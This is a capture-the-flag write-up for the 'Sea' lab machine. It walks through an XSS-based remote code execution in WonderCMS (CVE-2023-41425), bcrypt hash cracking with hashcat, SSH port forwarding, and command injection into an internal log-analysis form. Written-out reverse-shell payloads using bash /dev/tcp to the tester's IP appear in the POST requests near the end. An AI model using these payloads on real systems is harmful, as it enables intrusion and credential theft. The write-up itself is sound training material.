# CTF Writeup: Sea

## Lab Description

`Sea` is an Easy Difficulty Linux machine that features [CVE-2023-41425](https://nvd.nist.gov/vuln/detail/CVE-2023-41425) in WonderCMS, a cross-site scripting (XSS) vulnerability that can be used to upload a malicious module, allowing access to the system. The privilege escalation features extracting and cracking a password from WonderCMS's database file, then exploiting a command injection in custom-built system monitoring software, giving us root access. 


---

## Reconaissance

An initial scan revealed the following information about services on the target

```
nmap -A -p- --min-rate 10000 10.129.55.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 09:23 EDT
Nmap scan report for 10.129.55.138
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   19.81 ms 10.10.14.1
2   20.00 ms 10.129.55.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.82 seconds
```

Analyzing the http website, there is an url link called "Contact", which redirects us to an domain called "sea.htb".

```
sudo echo "10.129.55.138 sea.htb" | sudo tee -a /etc/hosts
```

## Vulnerability Assessment

Analyzed the webpage, it looks like an bike racing CMS should be up and running. Googled for "bike racing CMS exploit" and found "WonderCMS RCE" CVE-2023-41425 PoC

```
https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413
```

Downloaded it locally
```
chmod +x CVE-2023-41425.py
```

Had to fix identiation of the source code, utilized LLM's for that.

```
python3 CVE-2023-41425.py http://sea.htb/loginURL 10.10.14.186 1337
[+] xss.js is created
[+] execute the below command in another terminal

----------------------------
nc -lvp 1337
----------------------------

send the below link to admin:

----------------------------
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.186:8000/xss.js"></script><form+action="
----------------------------


starting HTTP server to allow the access to xss.js
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

The payload itself generates an xss.js file, which provides us with an reverse shell. In order for this exploit to succeed we will have to download the main.zip file from the Creator of the PoC.

```
wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
--2025-10-21 10:55:10--  https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://codeload.github.com/prodigiousMind/revshell/zip/refs/heads/main [following]
--2025-10-21 10:55:10--  https://codeload.github.com/prodigiousMind/revshell/zip/refs/heads/main
Resolving codeload.github.com (codeload.github.com)... 140.82.121.9
Connecting to codeload.github.com (codeload.github.com)|140.82.121.9|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/zip]
Saving to: ‘main.zip’

main.zip                    [ <=>                          ]   2.62K  --.-KB/s    in 0s      

2025-10-21 10:55:10 (13.2 MB/s) - ‘main.zip’ saved [2680]
```


## Initial Access


Also we will need to modify our the CVE-2023-41425.py script in order for it to work.


Change the variable urlRev to ur python server's ip address + port

```
var urlRev = urlWithoutLogBase+"/?installModule=http://10.10.14.186:8000/main.zip&directoryName=violet&type=themes&token=" + token;
```

And change the urlWithoutLogBase parameter to .hostname;

```
var urlWithoutLogBase = new URL(urlWithoutLog).hostname;
```

Unzipping the main.zip and analyzing the revshell itself, we can clearly see that the target ip is configured for localhost, but there is parameters called lhost & lport which we can utilize.
Let's check if the script itself has been uploaded to the server.

```
xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
```

it is uploaded, but I'm assuming the parameters were not parsed correctly. Let's parse them in manually!

```
http://sea.htb//themes/revshell-main/rev.php?lhost=10.10.14.186&lport=1337
```

Gained RCE as user www-data

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.55.138] 44344
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 15:42:54 up  3:32,  0 users,  load average: 0.71, 0.92, 0.98
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## Privilege Escalation


There is 3 users on the server

```
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
amay:x:1000:1000:amay:/home/amay:/bin/bash
geo:x:1001:1001::/home/geo:/bin/bash
```

Retrieved an encoded password string in /var/www/sea/data/database.js

```
www-data@sea:/var/www/sea/data$ cat database.js | grep "password"
cat database.js | grep "password"
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
```

Since this is an .js database, we can assume and also LLM tells me, that the encoded password has unnecessary backslashes inside it. Let's remove them! 

```
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```

Now we can bruteforce the password of the user utilizing hashcat & rockyou.txt


```
hashcat -m 3200 -a 0 password.hash /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-11th Gen Intel(R) Core(TM) i7-1185G7 @ 3.00GHz, 5456/10912 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (7558 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
Time.Started.....: Tue Oct 21 12:04:00 2025 (39 secs)
Time.Estimated...: Fri Oct 24 02:59:38 2025 (2 days, 14 hours)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       63 H/s (29.90ms) @ Accel:8 Loops:32 Thr:1 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 2432/14344385 (0.02%)
Rejected.........: 0/2432 (0.00%)
Restore.Point....: 2432/14344385 (0.02%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:352-384
Candidate.Engine.: Device Generator
Candidates.#01...: leonel -> althea
Hardware.Mon.#01.: Util: 84%

$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
Time.Started.....: Tue Oct 21 12:04:00 2025 (48 secs)
Time.Estimated...: Tue Oct 21 12:04:48 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       64 H/s (30.03ms) @ Accel:8 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3072/14344385 (0.02%)
Rejected.........: 0/3072 (0.00%)
Restore.Point....: 3008/14344385 (0.02%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#01...: blessing -> dangerous
Hardware.Mon.#01.: Util: 84%

Started: Tue Oct 21 12:03:02 2025
Stopped: Tue Oct 21 12:04:50 2025
```

Retrieved password mychemicalromance

Logged in successfully with amay:mychemicalromance via ssh.


```
ssh amay@sea.htb               
The authenticity of host 'sea.htb (10.129.55.138)' can't be established.
ED25519 key fingerprint is SHA256:xC5wFVdcixOCmr5pOw8Tm4AajGSMT3j5Q4wL6/ZQg7A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'sea.htb' (ED25519) to the list of known hosts.
amay@sea.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 21 Oct 2025 04:08:03 PM UTC

  System load:  1.18              Processes:             246
  Usage of /:   65.0% of 6.51GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for eth0: 10.129.55.138
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Aug  5 07:16:49 2024 from 10.10.14.40
amay@sea:~$
```

Retrieved user.txt in /home/amay directory.


```
e19546ae7226ef866a7c27e504017d0c
```

Checking for running services on the target, we retrieve that the 8080 port is open.

```
netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:58747         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

Let's findout more abt this service, since it is only available in the internal network, we will need to portforward 8080 on our localhost.
We can do it by utilizing ssh.



```
ssh amay@sea.htb -L 8080:127.0.0.1:8080
amay@sea.htb's password: 
bind [127.0.0.1]:8080: Address already in use
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 21 Oct 2025 04:39:57 PM UTC

  System load:  1.19              Processes:             249
  Usage of /:   65.4% of 6.51GB   Users logged in:       1
  Memory usage: 16%               IPv4 address for eth0: 10.129.55.138
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Oct 21 16:08:06 2025 from 10.10.14.186
amay@sea:~$
```

Since BurpSuite is already running on :8080 on my kali linux vm I will forward it to 8083

```
ssh amay@sea.htb -L 8083:127.0.0.1:8080
```

Displaying the process page on 127.0.0.1:8083 provides us with information about auth.log, but we aren't able to enumerate creds in anyway, let's intercept traffic and check for command injection vulns. Since the lab description points towards it. 

Note: if your BurpSuite doesn't intercept localhost traffic, go into firefox browser & type in "about:config" proceed and set network.proxy.allow_hijacking_localhost --> true

Tested the log_file parameter for command injection & it worked!

```
POST / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: http://127.0.0.1:8081
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Referer: http://127.0.0.1:8081/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

log_file=%2Fvar%2Flog%2Fauth.log$(sleep 10)&analyze_log=
```

Let's start up a listener on 8888 & put our rev shell payload inside the log_file parameter (url-encoded)
The whole network package would look like this:

```
POST / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: http://127.0.0.1:8081
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Referer: http://127.0.0.1:8081/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

log_file=%2Fvar%2Flog%2Fauth.log$(/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.186/8888+0>%261')&analyze_log=
```

We were able to get RCE as root, but the issue was that the shell died immediatly.

```
nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.5.143] 53344
bash: cannot set terminal process group (3648): Inappropriate ioctl for device
bash: no job control in this shell
root@sea:~/monitoring#
```

Retrieved root.txt in /root directory.

```
bdd1fa2b1a0bdce48c0cbb9ba12a5795
```


In order to get an stable shell, we can utilize "nohup"

the final network package should look like this:

```
POST / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 119
Origin: http://127.0.0.1:8081
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Referer: http://127.0.0.1:8081/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

log_file=%2Fvar%2Flog%2Fauth.log$(/bin/bash+-c+'nohup+bash+-i+>%26+/dev/tcp/10.10.14.186/8888+0>%261+%26')&analyze_log=
```
